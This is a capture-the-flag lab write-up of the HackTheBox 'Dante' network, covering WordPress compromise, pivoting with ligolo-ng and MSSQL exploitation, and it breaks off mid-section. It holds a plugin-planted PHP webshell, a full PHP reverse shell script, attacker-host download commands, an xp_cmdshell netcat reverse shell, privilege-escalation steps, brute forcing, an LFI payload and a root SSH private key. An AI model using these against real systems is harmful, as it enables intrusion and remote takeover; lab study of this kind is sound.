
Subnet: 10.10.110.0/24

10.10.110.2 is out-of-scope because it represents the firewall.

---
# DANTE-WEB-NIX01

## Reconnaissance

Started off with enumerating active instances on the subnet.

```
nmap -sn 10.10.110.0/24
```

There seemed to be only host replying 10.10.110.100. This seems to be our entry point and the first machine we'll need to attack in order to enter internal networks.

```
nmap -n -Pn -sSCV -p- 10.10.110.100                    
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-24 23:01 -0500
Nmap scan report for 10.10.110.100
Host is up (0.021s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.124
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV IP 172.16.1.100 is not the same as 10.10.110.100
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 8f:a2:ff:cf:4e:3e:aa:2b:c2:6f:f4:5a:2a:d9:e9:da (RSA)
|   256 07:83:8e:b6:f7:e6:72:e9:65:db:42:fd:ed:d6:93:ee (ECDSA)
|_  256 13:45:c5:ca:db:a6:b4:ae:9c:09:7d:21:cd:9d:74:f4 (ED25519)
65000/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 2 disallowed entries 
|_/wordpress DANTE{Y0u_Cant_G3t_at_m3_br0!}
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 136.16 seconds
```

The nmap scan revealed a lot of information, but most importantly it revealed the first flag!

```
DANTE{Y0u_Cant_G3t_at_m3_br0!}
```

The Target seems to be an Linux Server with FTP, SSH & an HTTP Webserver being active with an WordPress CMS being active aswell.

The first thing I tried was actually authenticating to the FTP Service anonymously and it worked!

```
ftp 10.10.110.100 21
```

But inspecting the shares lagged us out. Judging from the nmap scan it redirects to the internal network, which we clearly have no route to from our attacker machine. But maybe later? :)

Proceeded with enumerating the webserver running on port 65000. I'll run feroxbuster first to enumerate endpoints efficiently, while I start manual enumeration.

```
feroxbuster --url http://10.10.110.100:65000
```

It revealed an exposed admin panel and /wordpress endpoint. Upon inspecting the /wp-admin endpoint we get redirected to localhost. So this is an dead-end. Let's inspect the actual website. It seems to be an default apache webpage with nothing configured. Upon inspecting the /wordpress endpoint we see an unfinished webpage.

The Source Code of the /wordpress endpoint and the web-root didn't provide anything useful and there were no real functionalities active. Upon inspecting /robots.txt I found the first flag. Which we previously discovered through the nmap scan.

Since I wanted to enumerate subdomains. Let's map the target ip address 10.10.110.100 to an domain called ffuf.htb in our local dns file.

```
echo "10.10.110.100 ffuf.htb" | tee -a /etc/hosts
```

Let's enumerate subdomains: 

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://10.10.110.100:65000 -H "Host: FUZZ.ffuf.htb" -fs 10918
```

This was unsuccessful, let's continue to enumerate endpoints with gobuster & dirsearch aswell!

```
dirsearch -u http://ffuf.htb:65000
```

Enumerating endpoints with ffuf was more promising than feroxbuster, since we enumerated an endpoint called /wp-login.php. Which was one of the only endpoints which didn't redirect us to localhost.

```
http://10.10.110.100:65000/wordpress/wp-login.php
```

We are being greeted by an unfinished login panel.

I reran dirsearch but this time specifically on the /wordpress endpoint and it identified an interesting .wp-config.php.swp file I saved it onto my local machine.

```
dirsearch -u http://ffuf.htb:65000/wordpress
```

The file itself was encoded, but viewing it with the tool "strings" revealed important information.

It revealed the hostname of the target "DANTE-WEB-NIX01" and MySQL Database Credentials:

```
shaun:password
```

I tried bruteforcing SSH & FTP, but nothing worked.

```
hydra -l shaun -P /usr/share/wordlists/rockyou.txt ssh://10.10.110.100
```

Enumerated web architecture and found out that WordPress seems to be Version 5.4.1!

```
whatweb 10.10.110.100:65000/wordpress
```

Utilized wpscan to enumerate the wordpress content management system and also tried bruteforcing with user shaun, but it didn't come to any result.

```
wpscan --url http://10.10.110.100:65000/wordpress -U shaun -P /usr/share/wordlists/rockyou.txt
```

Utilized another scan to enumerate plugins. Found "akismet" expired with version 4.5.1 but couldn't find any interesting CVE's.

```
wpscan --url http://10.10.110.100:65000/wordpress --enumerate p --plugins-detection aggressive
```

I ran another bruteforce try for the FTP Share.

```
hydra -C /usr/share/wordlists/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://10.10.110.100
```

I gained 2-3 new interesting credential pairs, but nothing helped.

```
ftp:b1uRR3
ftp:ftp
anonymous:anonymous
```

Tried Crawling any interesting endpoints and tried manipulating network packages using BurpSuite, but most of it is uninteresting.

I'll try to bruteforce the wp-login.php instance some more, but this time with username "admin". Not "shaun".

Since I had no more methodology to go through. I decided to ask for some hints. I finally got the hint that the ftp service, which I thought is completly down, since he redirects into an internal network (which we can't reach). It's true but after 1-2 mins it cancels this connection and we can see the share listing.. wow.. never experienced this before. 

Downloaded an todo.txt file onto my local machine.

```
get todo.txt
```

In this we get information about an LFI Vuln being present on "the other site" and an user named "James". Also bruteforced with an a bit smaller wordlist than rockyou.txt.

```
wpscan --url http://10.10.110.100:65000/wordpress --usernames James --passwords /usr/share/wordlists/SecLists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt
```

After 16 Minutes of bruteforcing I found valid credentials for user James!

```
James:Toyota
```

After further realisation I came to another conclusion. My current lab is destroyed/broken. Someone was in a troll mood I guess.. so I changed my Server and boom. Instantly all wordpress instances weren't redirecting anymore to localhost and the ftp service reacted instantly. 

I navigated to the /wp-admin endpoint and logged in with the previously discovered credentials.

I enumerated the wordpress CMS & found out that there is 3 pages. An /meet-the-team endpoint in which all "teammember" are listed. Stored them inside an users.txt file.

```
kevin
balthazar
aj
nathan
```

On the next day I tried connecting to another lab and it worked! The box is not destroyed, I logged into the CMS & modified akismet plugin "class.akismet-cli.php" and inserted an small php webshell.

```
<?php system($_GET["cmd"]); ?>
```

Started up my python3 webserver on my local machine & transfered nc binary to the target system.

```
python3 -m http.server 80
```

```
http://10.10.110.100:65000/wordpress/wp-content/plugins/akismet/class.akismet-cli.php?cmd=wget%20http://10.10.14.167/nc%20nc
```

Started up listener on my local machine.

```
nc -lvnp 22
```

This unfortunately didn't workout. So I decided to go back into the plugin editor in the WordPress CMS & replace the webshell with the following php reverse shell script: 

```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.167';  // CHANGE THIS
$port = 65000;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 




```

Started up my netcat listener on my local machine.

```
nc -lvnp 65000
```

Viewed the endpoint in the browser to execute my script:

```
http://10.10.110.100:65000/wordpress/wp-content/plugins/akismet/class.akismet-cli.php
```

Gained RCE as user www-data.

```
nc -lvnp 65000
listening on [any] 65000 ...
connect to [10.10.14.167] from (UNKNOWN) [10.10.110.100] 43108
Linux DANTE-WEB-NIX01 5.4.0-29-generic #33-Ubuntu SMP Wed Apr 29 14:32:27 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 07:46:04 up 12:40,  1 user,  load average: 0.03, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
james    :0       :0               Fri19   ?xdm?   5:10   0.01s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu /usr/bin/gnome-session --systemd --session=ubuntu
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

Performed Shell Hardening.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo ; fg ; reset
stty columns 200 rows 200
export TERM=xterm
```

I then moved onto james home directory /home/james and enumerated it. We can't view the flag.txt since we are lacking authorization. But we were able to view his bash history and gained credentials for user balthazar.

```
mysql -u balthazar -p TheJoker12345!
```

It also provided an hint on an MySQL Database running internally on the server. Let's verify this.

```
netstat -tulnp
```

It does! Let's try & connect with the retrieved credentials.

Oddly enough access is denied. Let's login as user balthazar.

```
su balthazar
```

I found an interesting file called "PwnKit" on his Desktop. Executed it for fun and gained root permissions. Wow

```
./PwnKit
```

Navigated back to james directory and retrieved the flag.txt stored inside.

```
DANTE{j4m3s_NEEd5_a_p455w0rd_M4n4ger!}
```

Navigated to user root's directory and retrieved flag.txt

```
DANTE{Too_much_Pr1v!!!!}
```

Since I now rooted the Webserver / DMZ I decided to enumerate network interfaces, so we can pivot into the internal network. Since this was the only target in the DMZ, this has to be the dual-host which we can abuse to pivot. Yes it is!

```
ifconfig
```

But before doing so, I decided to actually save up the private ssh key of the root user. So I can easily get another shell later on.

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Downloaded ligolo-ng proxy binary onto the target machine.

```
wget http://10.10.14.167/linux_agent linux_agent
```

Prepared Ligolo-Ng Interface on my local machine.

```
ip tuntap add user saitama mode tun ligolo
```

```
ip link set ligolo up
```

```
ligolo-proxy -selfcert
```

I then executed the linux_agent binary on the target machine to connect back to my proxy interface (which is running on port 11601)

```
./linux_agent -connect 10.10.14.167:11601 -ignore-cert
```

Activated tunnel in ligolo-ng

```
session
start --tun ligolo
```

Added route to internal network on my attacker machine.

```
ip route add 172.16.1.0/24 dev ligolo
```

---
# Host Discovery

Tried to enumerate active endpoints in the internal subnet.
Started with checking SMB

```
for i in {1..254} ;do (ping -c 1 172.16.1.$i | grep "bytes from" &) ;done
```

Identified 10 (1 of them is the dual-hosted machine ip) Hosts in the subnet, so 5 more to go! I'm assuming they are inside another internal network.

```
172.16.1.5
172.16.1.10
172.16.1.12
172.16.1.13
172.16.1.17
172.16.1.19
172.16.1.20
172.16.1.101
172.16.1.102
```

Let's perform Reconnaissance on all target machines.

```
nmap -n -Pn -sSCV -p- 172.16.1.5 172.16.1.10 172.16.1.12-13 172.16.1.17 172.16.1.19-20 172.16.1.100-102
```

Created folders & saved the indiviual nmap scans for the target servers/ip's.

---
# DANTE-SQL01

I decided to start with DANTE-SQL01 (172.16.1.5).

```
Nmap scan report for 172.16.1.5
Host is up (0.035s latency).
Not shown: 65518 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          FileZilla ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r-- 1 ftp ftp             44 Jan 08  2021 flag.txt
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
111/tcp   open  rpcbind      2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   172.16.1.5\SQLEXPRESS: 
|     Target_Name: DANTE-SQL01
|     NetBIOS_Domain_Name: DANTE-SQL01
|     NetBIOS_Computer_Name: DANTE-SQL01
|     DNS_Domain_Name: DANTE-SQL01
|     DNS_Computer_Name: DANTE-SQL01
|_    Product_Version: 10.0.14393
| ms-sql-info: 
|   172.16.1.5\SQLEXPRESS: 
|     Instance name: SQLEXPRESS
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 1433
|_    Clustered: false
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-07-25T11:50:46
|_Not valid after:  2056-07-25T11:50:46
|_ssl-date: 2026-07-25T17:26:08+00:00; 0s from scanner time.
2049/tcp  open  nlockmgr     1-4 (RPC #100021)
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49673/tcp open  ms-sql-s     Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   172.16.1.5:49673: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 49673
| ms-sql-ntlm-info: 
|   172.16.1.5:49673: 
|     Target_Name: DANTE-SQL01
|     NetBIOS_Domain_Name: DANTE-SQL01
|     NetBIOS_Computer_Name: DANTE-SQL01
|     DNS_Domain_Name: DANTE-SQL01
|     DNS_Computer_Name: DANTE-SQL01
|_    Product_Version: 10.0.14393
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-07-25T11:50:46
|_Not valid after:  2056-07-25T11:50:46
49677/tcp open  msrpc        Microsoft Windows RPC
49678/tcp open  msrpc        Microsoft Windows RPC
49679/tcp open  msrpc        Microsoft Windows RPC
49680/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-07-25T17:25:30
|_  start_date: 2026-07-25T11:50:25
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: DANTE-SQL01, NetBIOS user: <unknown>, NetBIOS MAC: a2:de:ad:74:c1:b5 (unknown)
```

Connected to the FTP Share anonymously.

```
ftp 172.16.1.5 21
```

Retrieved the 19th flag.txt in the FTP Share.

```
DANTE{Ther3s_M0r3_to_pwn_so_k33p_searching!}
```

I checked if we can authenticate via anonymous user or guest user, both both were denied/disabled.

```
nxc smb 172.16.1.5 -u '' -p '' --shares
nxc smb 172.16.1.5 -u 'guest' -p '' --shares
```

Tried to authenticate via RPC anonymously, but access is denied.

```
rpcclient -U "" -N 172.16.1.5
```

I also see that mountd is open on port 2049. Let's try & check it out!

Trying to access any mounted shares also didn't work.

```
showmount -e 172.16.1.5
```

Let's move on to the next target.

After comprimising all of the Domain Controllers & DANTE-ADMIN-06 I received credentials for this machine:

```
Sophie:TerrorInflictPurpleDirt996655
```

Let's try & leverage them to gain access to the target system. Started spraying with nxc on smb & winrm, but access was denied.

```
nxc smb 172.16.1.5 -u Sophie -p TerrorInflictPurpleDirt996655
```

Upon spraying MSSQL I received an error that Login failed, because it's from untrusted domain. Let's try it with local auth!

```
nxc mssql 172.16.1.5 -u Sophie -p TerrorInflictPurpleDirt996655 --local-auth
```

We pwned it! Which means we can authenticate against mssql.

Connected to the MSSQL Database.

```
impacket-mssqlclient Sophie:'TerrorInflictPurpleDirt996655'@172.16.1.5
```

Checked if we can execute commands using xp_cmdshell. Yes we can!

```
EXEC xp_cmdshell 'whoami';
output                        
---------------------------   
nt service\mssql$sqlexpress
```

Seems like we are an Service Account. Let's try & transfer an nc.exe file to the target server to get RCE to our local machine.

Started up listener on port 443 on my local machine.

```
rlwrap nc -lvnp 443
```

Transfered nc.exe onto target server.

```
EXEC xp_cmdshell 'certutil -urlcache -split -f http://10.10.14.70/nc.exe C:\Windows\Tasks\nc.exe';
```

Executed reverse connection from target server as service user.

```
EXEC xp_cmdshell 'C:\Windows\Tasks\nc.exe 10.10.14.70 443 -e cmd.exe';
```

Gained RCE.

```
rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.70] from (UNKNOWN) [10.10.110.3] 27196
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Retrieved flag.txt in C:\Users

```
DANTE{Mult1ple_w4Ys_in!}
```
## Privilege Escalation

Enumerated groups & permissions of the service account.

```
whoami /all
```

He has SeImpersonatePrivilege enabled. Let's abuse PrintSpoofer.exe in order to gain SYSTEM Shell. Transfered the file onto the target server.

```
certutil -urlcache -split -f http://10.10.14.70/PrintSpoofer.exe PrintSpoofer.exe
```

Executed it and gained SYSTEM Shell.

```
PrintSpoofer.exe -i -c cmd.exe
```

Retrieved flag.txt in C:\Users\Administrator\Desktop.

```
DANTE{Ju1cy_pot4t03s_in_th3_wild}
```

Comprimised DANTE-SQL01, let's move onto the last server DANTE-NIX07

---
# DANTE-NIX02

The nmap scan revealed the following information about the target server.

```
Nmap scan report for 172.16.1.10
Host is up (0.029s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5a:9c:1b:a5:c1:7f:2d:4f:4b:e8:cc:7b:e4:47:bc:a9 (RSA)
|   256 fd:d6:3a:3f:a8:04:56:4c:e2:76:db:85:91:0c:5e:42 (ECDSA)
|_  256 e2:d5:17:7c:58:75:26:5b:e1:1b:98:39:3b:2c:6c:fc (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Dante Hosting
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -1s
| smb2-time: 
|   date: 2026-07-25T17:25:27
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: DANTE-NIX02, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
```

Ran enum4linux and found out about 2 users.

```
enum4linux -a 172.16.1.10
```

```
frank
margaret
```

Started with enumerating SMB Shares anonymously & it worked!

```
nxc smb 172.16.1.10 -u '' -p '' --shares
```

There seems to be an non-default Share called "SlackMigration" in which we have read permissions. Also checked guest authentication, but it seems to have the same permissions. Let's check the Share out! 

```
smbclient \\\\172.16.1.10/SlackMigration
```

Inside the share is an "admintasks.txt" file which I downloaded onto my local machine.

```
get admintasks.txt
```

The .txt file provides us with the information of an running wordpress cms on the target system and verifies the user margaret.

Upon viewing the page I discovered that the functionalities of the webpage aren't finished. When clicking on about, the url gets an /nav.php?page= parameter which is interesting. Let's test for LFI! It's active.

```
http://172.16.1.10/nav.php?page=/etc/passwd
```

I was able to enumerate all users stored on the target server.
Since SSH is active, let's check if we can view the SSH Private Keys of user "frank" & "margaret".

Enumerated the LFI Vulnerablity further didn't provide any RFI, any other viewable files besides /etc/passwd. Enumerating endpoints also didn't reveal any useful insights.

Let's map the target ip address to an domain called nix02.htb so we can bruteforce subdomains.

```
echo "172.16.1.10 nix02.htb" | tee -a /etc/hosts
```

Enumerated subdomains with "ffuf".

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://172.16.1.10 -H "Host: FUZZ.nix02.htb" -fs 28842
```

After trying tons of php filter methods and configuration files out I finally found a way to read the wp-config.php file.

```
